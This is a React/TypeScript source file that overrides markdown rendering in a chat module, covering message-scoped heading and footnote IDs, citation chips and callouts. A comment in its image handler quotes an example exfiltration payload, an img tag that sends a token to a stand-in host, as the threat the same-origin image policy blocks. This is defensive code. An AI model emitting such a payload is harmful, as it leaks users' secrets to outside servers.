import { createElement, useMemo, type JSX, type ReactNode } from 'react'
import { MarkdownTable } from '@/components/common/MarkdownTable'
import { MarkdownCodeBlock } from '@/components/common/MarkdownCodeBlock'
import {
  nodeToText,
  slugifyHeading,
  safeDecode,
  HEADING_CLASS,
  LINK_CLASS,
} from '@/components/common/markdownHeadings'
import { renderGfmAlert } from '@/components/common/gfmAlert'
import { BlockedImage } from '@/components/common/BlockedImage'
import { ReservedImage } from '@/components/common/ReservedImage'
import { classifyImageSrc } from '@/components/common/imageSrcPolicy'
import { CitationChip } from '@/modules/chat/core/utils/CitationChip'
import { isCitationHref } from '@/modules/chat/core/utils/citationTokenize'
import { cn } from '@/lib/utils'

/**
 * Returns Streamdown component overrides shared by all markdown renderers in the chat module.
 * Pass a unique `contentId` to scope footnote + heading DOM IDs — prevents cross-message ID
 * collisions when multiple messages contain the same footnote numbers / heading text, and lets
 * in-markdown hash links (`[Section](#section)`) scroll to THIS message's heading.
 */
export function useStreamdownComponents(contentId: string) {
  return useMemo(() => {
    // A slugged, message-scoped `id` on each heading so in-markdown hash links
    // resolve to THIS message's heading (never a same-slug heading in another
    // message). Respects an id the source already set (e.g. footnote anchors).
    const headingId = (children: ReactNode, existing?: string) => {
      if (existing) return existing
      const slug = slugifyHeading(nodeToText(children))
      return slug ? `${contentId}-h-${slug}` : undefined
    }
    const makeHeading =
      (level: 1 | 2 | 3 | 4 | 5 | 6) =>
      (props: JSX.IntrinsicElements['h1']) =>
        createElement(`h${level}`, {
          ...props,
          id: headingId(props.children, props.id),
          // Re-apply Streamdown's default heading class (overriding drops it).
          className: cn(HEADING_CLASS[level], props.className),
        })

    return {
      // Replace Streamdown's native-scroller + in-page-fullscreen table wrapper
      // with our OverlayScrollbars + open-in-popup-window version.
      table: MarkdownTable,
      // Re-wrap Streamdown's code block so its copy/download controls get the
      // app's styled kit Tooltip (default only carries a native `title`).
      pre: MarkdownCodeBlock,
      h1: makeHeading(1),
      h3: makeHeading(3),
      h4: makeHeading(4),
      h5: makeHeading(5),
      h6: makeHeading(6),
      h2(props: JSX.IntrinsicElements['h2']) {
        if (
          props.id === 'footnote-label' ||
          props.id === 'user-content-footnote-label'
        ) {
          // Suppressed — the section override renders "References" via <summary>
          return null
        }
        return (
          <h2
            {...props}
            id={headingId(props.children, props.id)}
            className={cn(HEADING_CLASS[2], props.className)}
          />
        )
      },
      section(props: JSX.IntrinsicElements['section']) {
        const { children, ...rest } = props
        if ((rest as Record<string, unknown>)['data-footnotes'] === undefined) {
          return <section {...rest}>{children}</section>
        }
        // Collapsed by default (no `open` attribute)
        return (
          <details className="footnote-section mt-4">
            <summary>References</summary>
            {children}
          </details>
        )
      },
      a(props: JSX.IntrinsicElements['a']) {
        const { href, className, target: _target, id, ...rest } = props
        // Inline `[n]` knowledge-base citation → focusable chip (FB-11). The
        // tokenizer rewrote the model's bare `[n]` into `[n](#kb-cite-n)`.
        const citeN = isCitationHref(href)
        if (citeN !== null) return <CitationChip n={citeN} />
        // Hide ↩ back-reference icons — they produce stray icons when footnote
        // definitions contain \n\n (multi-paragraph footnotes).
        // Check both class (older remark-gfm) and attribute (remark-gfm v4).
        if (
          className?.includes('data-footnote-backref') ||
          (rest as Record<string, unknown>)['data-footnote-backref'] !== undefined
        ) {
          return null
        }
        // Scope footnote IDs/hrefs to this content block so clicking [1] in message 2
        // scrolls to message 2's references, not message 1's (duplicate DOM IDs issue).
        const scopedId = id?.startsWith('user-content-fnref-')
          ? `${contentId}-fnref-${id.slice('user-content-fnref-'.length)}`
          : id
        const scopedHref = href?.startsWith('#user-content-fn-')
          ? `#${contentId}-fn-${href.slice('#user-content-fn-'.length)}`
          : href?.startsWith('#user-content-fnref-')
          ? `#${contentId}-fnref-${href.slice('#user-content-fnref-'.length)}`
          : href?.startsWith('#')
          ? // A plain in-markdown hash link (`[Section](#section)`): re-target it
            // at this message's slugged heading id (same slugify as the heading).
            `#${contentId}-h-${slugifyHeading(safeDecode(href.slice(1)))}`
          : href
        // All hash links — scroll within the current page
        if (scopedHref?.startsWith('#')) {
          return (
            <a
              {...rest}
              id={scopedId}
              href={scopedHref}
              // Re-apply Streamdown's default link class (overriding drops it).
              className={cn(LINK_CLASS, className)}
              onClick={(e) => {
                e.preventDefault()
                const target = document.getElementById(scopedHref.slice(1))
                if (target) {
                  // Open the outer .footnote-section <details>
                  target.closest('details')?.setAttribute('open', '')
                  // Open any .footnote-quote <details> inside the target <li>
                  target.querySelectorAll('details').forEach((d) => d.setAttribute('open', ''))
                  target.scrollIntoView({ behavior: 'smooth', block: 'start' })
                }
              }}
            />
          )
        }
        // External links — open in new tab
        return <a id={scopedId} href={scopedHref} className={cn(LINK_CLASS, className)} {...rest} target="_blank" rel="noreferrer" />
      },
      blockquote(props: JSX.IntrinsicElements['blockquote']) {
        // A `> [!NOTE]`-style GFM alert renders as a styled callout, not the
        // generic "Cited excerpt" collapsible (which would show the raw marker).
        const alert = renderGfmAlert(props.children)
        if (alert) return alert
        return (
          <details className="footnote-quote">
            <summary>Cited excerpt</summary>
            <blockquote {...props} />
          </details>
        )
      },
      img(props: JSX.IntrinsicElements['img']) {
        // Block external img src to prevent data-exfil via
        // `<img src="https://exfil.test/?token=...">` embedded in
        // markdown. Streamdown 2's default `allowedImagePrefixes: ['*']`
        // would allow this, and the `urlTransform` prop doesn't apply
        // to raw-HTML img tags (only markdown `![](url)` syntax).
        // Doing the check at the React component level catches both.
        // NOTE (message-scroll-perf ITEM-3/DEC-3): the exfil policy now lives in
        // the pure, unit-tested `classifyImageSrc`, which resolves the src
        // against the page origin (no `startsWith('/')` fast-path) — a TIGHTENING
        // of the original inline logic that also blocks the protocol-relative
        // `//host` and backslash `/\host` disguises the old check let through.
        // Only ALLOWED (same-origin) images route through ReservedImage, which
        // reserves row height so an async image load doesn't thrash the
        // virtualizer's row measurement. ReservedImage does NO src validation —
        // it only ever wraps an approved image.
        const src = props.src
        const verdict = classifyImageSrc(src, window.location.origin)
        if (verdict === 'empty') return null
        if (verdict === 'allowed') return <ReservedImage {...props} />
        // Blocked (external URL or data: URI) — show a placeholder instead of
        // rendering nothing (which left a broken-looking stray caption).
        return <BlockedImage src={src} alt={typeof props.alt === 'string' ? props.alt : undefined} />
      },
      li(props: JSX.IntrinsicElements['li']) {
        const { id, className, ...rest } = props
        // Scope footnote definition IDs to avoid cross-message duplicates
        const scopedId = id?.startsWith('user-content-fn-')
          ? `${contentId}-fn-${id.slice('user-content-fn-'.length)}`
          : id
        // GFM task-list items (`- [ ] …`) carry their own checkbox, so drop the
        // list bullet (list-none) — otherwise it reads as "• ☐ text". The
        // checkbox is styled via a descendant selector on the item (accent color
        // + a real gap to the label) rather than a raw <input> renderer, which
        // the kit guardrail forbids; a task item only ever contains the checkbox.
        const isTask = typeof className === 'string' && className.includes('task-list-item')
        // Re-apply Streamdown's default li classes (our override replaces its renderer,
        // losing "py-1 [&>p]:inline" which keeps the number and text on the same line)
        const mergedClassName = [
          'py-1',
          '[&>p]:inline',
          isTask &&
            'list-none [&_input]:me-1.5 [&_input]:size-3.5 [&_input]:translate-y-[2px] [&_input]:accent-primary',
          className,
        ]
          .filter(Boolean)
          .join(' ')
        return <li id={scopedId} className={mergedClassName} {...rest} />
      },
    }
  }, [contentId])
}
